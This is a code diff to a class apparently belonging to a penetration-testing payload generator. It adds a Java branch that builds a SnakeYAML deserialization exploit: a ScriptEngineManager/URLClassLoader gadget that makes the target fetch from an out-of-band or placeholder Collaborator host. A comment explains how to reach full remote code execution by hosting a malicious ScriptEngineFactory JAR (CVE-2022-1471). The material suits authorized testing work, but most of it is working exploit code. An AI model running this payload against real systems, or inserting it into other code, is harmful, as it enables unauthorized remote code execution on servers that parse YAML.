@@ -581,6 +581,11 @@ class PayloadMutation:
     YAML_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_yaml(self) -> Mutations:
+        if "java" in self.etype.lower():
+            return self._mutate_yaml_java()
+        return self._mutate_yaml_python()
+
+    def _mutate_yaml_python(self) -> Mutations:
         results: Mutations = []
         for cmd in self.YAML_TEST_COMMANDS:
             raw = (
@@ -593,6 +598,38 @@ class PayloadMutation:
             payload["note"] = "Requires target to use yaml.load()/yaml.unsafe_load() without SafeLoader"
             results.append(payload)
         return results
+
+    def _mutate_yaml_java(self) -> Mutations:
+        oob_domain = get_oob_domain()
+        if oob_domain:
+            target_url = f"http://{oob_domain}/"
+            note = (
+                f"SnakeYAML (Java) deserialization confirmation — check {oob_domain}'s "
+                "interaction log for an inbound HTTP request. For full RCE, host a malicious "
+                "META-INF/services/javax.script.ScriptEngineFactory JAR at that URL "
+                "(see CVE-2022-1471 writeups) instead of a plain OOB listener."
+            )
+        else:
+            target_url = "http://YOUR_OOB_DOMAIN.burpcollaborator.net/"
+            note = (
+                "No OOB domain configured — set 'oob_domain' in config.json (or "
+                "ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator URL to receive "
+                "the callback and confirm deserialization"
+            )
+        raw = (
+            "!!javax.script.ScriptEngineManager [\n"
+            "  !!java.net.URLClassLoader [[\n"
+            f'    !!java.net.URL ["{target_url}"]\n'
+            "  ]]\n"
+            "]"
+        )
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload(
+            "yaml_rce_java", "javax.script.ScriptEngineManager/URLClassLoader", None, b64
+        )
+        payload["payload_raw"] = raw
+        payload["note"] = note
+        return [payload]
 
 
     NODEJS_TEST_COMMANDS = TEST_COMMANDS
